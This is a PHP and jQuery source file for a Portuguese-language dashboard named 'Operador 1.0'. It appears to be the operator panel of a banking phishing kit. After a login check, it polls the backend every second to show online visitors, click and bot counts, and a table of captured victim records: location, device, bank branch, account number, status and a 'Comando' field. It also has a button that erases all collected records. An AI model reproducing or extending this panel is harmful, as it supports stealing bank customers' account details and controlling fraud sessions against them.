<?php
require_once('../webdriver/conexao.php');
require_once('../webdriver/function.php');

if (!isset($_SESSION['nome_usu_sessao'])) :
    echo '<b>Atenção essa é uma área restrita, por favor <a href="login.php">efetue login</a> para continuar.</b>';
    exit();
endif;

if (!isset($_SESSION['nome_usu_sessao'])) :
    $_SESSION['msg'] = "<div class='alert alert-danger icons-alert'>
    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <i class='icofont icofont-close-line-circled'></i>
    </button>
    <p><strong>Erro!</strong> Você precisa autenticar primeiro para ver esta pagina.</p>
    </div>";
    header("Location: ./login.php");
    exit();
endif;

?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Operador 1.0</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    </link>
    <link rel="stylesheet" href="css/all.css">
    </link>
    <link rel="stylesheet" href="css/custom.css">
    </link>
    <!--INCLUDE CSS-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/js/all.min.js" integrity="sha512-2bMhOkE/ACz21dJT8zBOMgMecNxx0d37NND803ExktKiKdSzdwn+L7i9fdccw/3V06gM/DBWKbYmQvKMdAA9Nw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!--INCLUDE CSS-->
    <script src="./js/function.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.js" integrity="sha512-nO7wgHUoWPYGCNriyGzcFwPSF+bPDOR+NvtOYy2wMcWkrnCNPKBcFEkU80XIN14UVja0Gdnff9EmydyLlOL7mQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo01" aria-controls="navbarTogglerDemo01" aria-expanded="false" aria-label="Alterna navegação">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarTogglerDemo01">

            <a class="navbar-brand" href="#"><img width="200" src="images/logo.png"></a>


            <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                <li class="nav-item">
                    <a class="nav-link" href="./index.php">Infos</a>
                </li>
            </ul>
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a id="botaosair" class="nav-link" href="#">Sair</a>
                </li>
            </ul>

        </div>

    </nav>
    <div class="pt-1">
        <div class="container-fluid mb-3" style="padding: 10px;">
            <div class="row">
                <div class="col-6">
                    <button type="button" class="btn btn-primary"><span id="segundos">0</span> Online</button>
                    <a target="_blank" href="../webdriver/live.db"><button type="button" class="btn btn-primary"><span id="contarclick">0</span> Clicks</button></a>
                    <a target="_blank" href="../webdriver/die.db"><button type="button" class="btn btn-danger"><span id="contarx9">0</span> Bots</button></a>
                    <br><br>
                    <button type="button" class="btn btn-primary"><span id="infostotal">0</span> Infos</button>
                    <button id="botaolimpar" type="button" class="btn btn-outline-danger">Limpar Tudo</button>
                </div>
                <div class="col-6">
                </div>
            </div>
        </div>
        <table id="infos" class="table">
            <thead>
                <tr>
                    <th scope="col">#</th>
                    <th scope="col">Local</th>
                    <th scope="col">Data Hora</th>
                    <th scope="col">Device</th>
                    <th scope="col">Agencia</th>
                    <th scope="col">Conta</th>
                    <th scope="col">Tipo</th>
                    <th scope="col">Status</th>
                    <th scope="col">Comando</th>
                    <th class="text-center" scope="col">Opções</th>
                </tr>
            </thead>
            <tbody id="visualizado">
            </tbody>

        </table>

    </div>
</body>

<script>
    $(document).ready(function() {

        $('#botaolimpar').on('click', function(evt) {
            if (confirm("Deseja mesmo apagar tudo?") == true) {

            } else {
                return false;
            }
            const request = $.ajax({
                url: "../webdriver/function.php?page=apagartudo",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'apagar_tudo'
                },
                cache: false
            });

            request.done(data => {
                alert('Solicitação efetuada com sucesso');
            })
        })

        $('#botaosair').on('click', function(evt) {
            if (confirm("Deseja mesmo finalizar a sessão?") == true) {

            } else {
                return false;
            }
            const request = $.ajax({
                url: "../webdriver/function.php?page=finalizar",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'finalizar_sessao'
                },
                cache: false
            });

            request.done(data => {
                location.href = './';
            })
        })

        var auto_refresh = setInterval(
            function() {
                $.ajax({
                    url: "../webdriver/paginas/header_infos.php",
                    type: "GET",
                    data: ({

                    }),
                    success: function(resposta) {
                        $('#resultado').html(resposta);
                        document.getElementById("visualizado").innerHTML = resposta;
                    }
                });
            }, 3000);

        var auto_refresh = setInterval(
            function() {
                $.ajax({
                    url: "../webdriver/function.php?page=contarinfos",
                    type: "GET",
                    data: ({

                    }),
                    success: function(resposta) {
                        $('#resultado').html(resposta);
                        document.getElementById("infostotal").innerHTML = resposta;
                    }
                });
            }, 1000);

        var auto_refresh = setInterval(
            function() {
                $.ajax({
                    url: "../webdriver/function.php?acao=online",
                    type: "GET",
                    data: ({

                    }),
                    success: function(resposta) {
                        $('#resultado').html(resposta);
                        document.getElementById("segundos").innerHTML = resposta;
                    }
                });
            }, 1000);

        var auto_refresh = setInterval(
            function() {
                $.ajax({
                    url: "../webdriver/function.php?page=contarclick",
                    type: "GET",
                    data: ({

                    }),
                    success: function(resposta) {
                        $('#resultado').html(resposta);
                        document.getElementById("contarclick").innerHTML = resposta;
                    }
                });
            }, 1000);

        var auto_refresh = setInterval(
            function() {
                $.ajax({
                    url: "../webdriver/function.php?page=contarx9",
                    type: "GET",
                    data: ({

                    }),
                    success: function(resposta) {
                        $('#resultado').html(resposta);
                        document.getElementById("contarx9").innerHTML = resposta;
                    }
                });
            }, 1000);
    });
</script>

</html>